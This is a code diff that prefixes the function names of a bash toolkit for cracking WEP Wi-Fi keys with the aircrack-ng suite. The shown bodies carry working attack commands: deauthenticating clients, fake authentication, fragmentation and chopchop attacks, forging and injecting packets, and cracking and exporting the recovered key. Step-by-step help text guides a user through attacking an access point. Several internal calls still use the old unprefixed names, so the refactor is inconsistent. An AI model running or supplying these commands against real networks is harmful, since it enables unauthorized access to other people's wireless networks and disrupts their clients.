@@ -17,7 +17,7 @@ DESTINATION_PORT="$SOURCE_PORT"
 CRACKED="cracked"
 
 # Kills possible disturbing applications
-function killdisturbing() {
+function wepcrack_killdisturbing() {
     airmon-ng check eth1 | awk '/Process with PID ([0-9]*)/ { print $4 }' | xargs kill -15
 }
 
@@ -25,17 +25,17 @@ function killdisturbing() {
 # Usage: aircheck
 #
 # Check if $IFACE is ready
-function aircheck() {
+function wepcrack_aircheck() {
     airmon-ng check $IFACE
 }
 
 # Starts airmon-ng on $IFACE for any channel
-function airstart() {
+function wepcrack_airstart() {
     airmon-ng start $IFACE
 }
 
 # Stops airmon-ng on $IFACE
-function airstop() {
+function wepcrack_airstop() {
     airmon-ng stop $IFACE
 }
 # }}}
@@ -44,7 +44,7 @@ function airstop() {
 #
 # Sets <mac address> to $IFACE.
 # If <mac address> is empty, then generate a random one.
-function newmac() {
+function wepcrack_newmac() {
     killdisturbing; airstop &> /dev/null
     
     if [[ $1 == "" ]]; then
@@ -59,7 +59,7 @@ function newmac() {
 }
 # Scan air, dump results, when user has what is needed for starthacking:
 # display hacking help message
-function viewaps() {
+function wepcrack_viewaps() {
     airodump-ng $IFACE
     helphacking
 }
@@ -67,7 +67,7 @@ function viewaps() {
 # Usage: deauth STATION
 #
 # Where STATION is the client mac address to deauth
-function deauth() {
+function wepcrack_deauth() {
     aireplay-ng -0 1 -c $1 -a $BSSID $IFACE
 }
 
@@ -76,7 +76,7 @@ function deauth() {
 #
 # Either from $ESSID/config.sh, either from arguments (which are then saved).
 # Folder $ESSID will also be useful to stock access point specific files.
-function starthacking() {
+function wepcrack_starthacking() {
     ESSID="$1"
     DIR="$ESSID"
     CONFIG="config.sh"
@@ -104,7 +104,7 @@ function starthacking() {
 # Can overwrite $CONFIG.
 #
 # Saves all *our* environment variables to $CONFIG file.
-function save() {
+function wepcrack_save() {
     if [[ $1 != "" ]]; then
         CONFIG="$1"
     fi
@@ -138,7 +138,7 @@ function save() {
 #
 # Loads environment variables from $CONFIG file.
 # Check it out: cat $CONFIG
-function load() {
+function wepcrack_load() {
     if [[ $1 != "" ]]; then
         CONFIG="$1"
     fi
@@ -147,12 +147,12 @@ function load() {
 }
 
 # Sets channel $CHANNEL to interface $IFACE, stops hoping.
-function channellock() {
+function wepcrack_channellock() {
     iwconfig $IFACE channel $CHANNEL
 }
 
 # Fake authentication attack, fast version
-function fakeauth() {
+function wepcrack_fakeauth() {
     echo "This is what you want to see: Association successful :-)"
     echo "And you don't want to see: Got deauthentication packet!"
     
@@ -163,7 +163,7 @@ function fakeauth() {
 #
 # You might need if the fakeauth works but that the AP drops the association
 # for some reason, *after* it worked.
-function fakeauthpicky() {
+function wepcrack_fakeauthpicky() {
     echo "This is what you want to see: Association successful :-)"
     echo ""
 
@@ -175,7 +175,7 @@ function fakeauthpicky() {
 # Waits for vulnerable beacon frame for the user to accept fraging the
 # $PRGA file
 # The vulnerable beacon frames that were found are written to $CAPSRC
-function frag() {
+function wepcrack_frag() {
     aireplay-ng -5 -h $MYMAC -b $BSSID $IFACE
     
     CAPSRC=`ls --sort=time replay_src-* | head -n1`
@@ -188,7 +188,7 @@ function frag() {
 #
 # Uses the first vulnerable beacon frame to frag the $PGRA file with IFACE
 # The vulnerable beacon frame that was found are written to $CAPSRC
-function autofrag() {
+function wepcrack_autofrag() {
     aireplay-ng -5 -F -h $MYMAC -b $BSSID $IFACE
     
     CAPSRC=`ls --sort=time replay_src-* | head -n1`
@@ -200,7 +200,7 @@ function autofrag() {
 # Usage: refrag
 #
 # Restart frag'ing the $PGRA file from $CAPSRC with $IFACE
-function refrag() {
+function wepcrack_refrag() {
     aireplay-ng -5 -F -r $CAPSRC -b $BSSID $IFACE
     
     PRGA=`ls --sort=time *.xor | head -n1`
@@ -214,7 +214,7 @@ function refrag() {
 # Waits for vulnerable beacon frame for the user to accept chopchoping the
 # $PRGA file
 # The vulnerable beacon frames that were found are written to $CAPSRC
-function chopchop() {
+function wepcrack_chopchop() {
     aireplay-ng -4 -h $MYMAC -b $BSSID $IFACE
     
     CAPSRC=`ls --sort=time replay_src-* | head -n1`
@@ -227,7 +227,7 @@ function chopchop() {
 #
 # Uses the first vulnerable beacon frame to chopchop the $PGRA file with IFACE
 # The vulnerable beacon frame that was found are written to $CAPSRC
-function autochopchop() {
+function wepcrack_autochopchop() {
     aireplay-ng -4 -F -h $MYMAC -b $BSSID $IFACE
     
     CAPSRC=`ls --sort=time replay_src-* | head -n1`
@@ -239,7 +239,7 @@ function autochopchop() {
 # Usage: rechopchop
 #
 # Restart chopchop'ing the $PGRA file from $CAPSRC with $IFACE
-function rechopchop() {
+function wepcrack_rechopchop() {
     aireplay-ng -4 -F -r $CAPSRC -b $BSSID $IFACE
     
     PRGA=`ls --sort=time *.xor | head -n1`
@@ -251,7 +251,7 @@ function rechopchop() {
 #
 # Dumps paquets read from $IFACE matching $CHANNEL and $BSSID to
 # $CAPTURE_PACKETS
-function capture() {
+function wepcrack_capture() {
     CAPTURE_PACKETS="capture"
 
     airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPTURE_PACKETS $IFACE
@@ -263,7 +263,7 @@ function capture() {
 #
 # Forges IVS generation paquets with $BSSID, $MYMAC, $PRGA and
 # writes them to $INJECT_PACKETS
-function forge() {
+function wepcrack_forge() {
     INJECT_PACKETS="inject"
 
     if [[ $DESTINATION_PORT != "" ]]; then
@@ -292,7 +292,7 @@ function forge() {
 #
 # User selects the paquet from file $INJECT_PACKETS to replay with $IFACE
 # spoofed as $MYMAC
-function inject() {
+function wepcrack_inject() {
     aireplay-ng -2 -F -h $MYMAC -r $INJECT_PACKETS $IFACE
 
     save
@@ -301,7 +301,7 @@ function inject() {
 # Usage: autoinject
 #
 # Injects the first packet of $INJECT_PACKETS with $IFACE spoofed as $MYMAC
-function autoinject() {
+function wepcrack_autoinject() {
     aireplay-ng -2 -f -h $MYMAC -r $INJECT_PACKETS $IFACE
 
     save
@@ -309,17 +309,17 @@ function autoinject() {
 
 # Cracks $CAPTURE_PACKETS corresponding to $BSSID with aircrack-ng, save the
 # output to $CRACKED
-function crack() {
+function wepcrack_crack() {
     aircrack-ng -b $BSSID $CAPTURE_PACKETS*.cap >> $CRACKED
 }
 
 # Faster than crack() because searchs for alphanumeric only
-function alphacrack() {
+function wepcrack_alphacrack() {
     aircrack-ng -z -b $BSSID $CAPTURE_PACKETS*.cap >> $CRACKED
 }
 
 # Parses $CRACKED and sets $KEY and $PASSWORD
-function exportcrack() {
+function wepcrack_exportcrack() {
     KEY=`awk '/KEY FOUND/ { print $4 }' $CRACKED`
 
     # The following works with lines like the following:
@@ -338,7 +338,7 @@ echo ""
 # Usage: helpintro [<show navigation=true]
 #
 # Prints possible steps to setup the hacking and other help commands
-function helpintro() {
+function wepcrack_helpintro() {
     echo "Setup your network interface(s):"
     echo ""
     echo "0) Make sure that no disturbing app is running: killdisturbing"
@@ -362,7 +362,7 @@ function helpintro() {
 # Usage: helphacking [<show navigation=true>]
 #
 # Prints possible steps to crack a WEP key and other help commands
-function helphacking() {
+function wepcrack_helphacking() {
     echo "Start hacking"
     echo ""
     echo "0) Start hacking an AP: starthacking <essid> [<bssid> <channel>"
@@ -393,7 +393,7 @@ function helphacking() {
     fi
 }
 
-function helpconnect() {
+function wepcrack_helpconnect() {
     echo "Connect to a configured wireless access point"
     echo ""
     echo "0) killdisturbing; airstop"
@@ -407,7 +407,7 @@ function helpconnect() {
     fi
 }
 
-function connect() {
+function wepcrack_connect() {
     if [[ $CONFIG == "" ]]; then
         CONFIG="config.sh"
     fi
@@ -415,7 +415,7 @@ function connect() {
     source $1/$CONFIG
 }
 
-function reload() {
+function wepcrack_reload() {
     if [[ $1 != "" ]]; then
         TIME=$1
     else
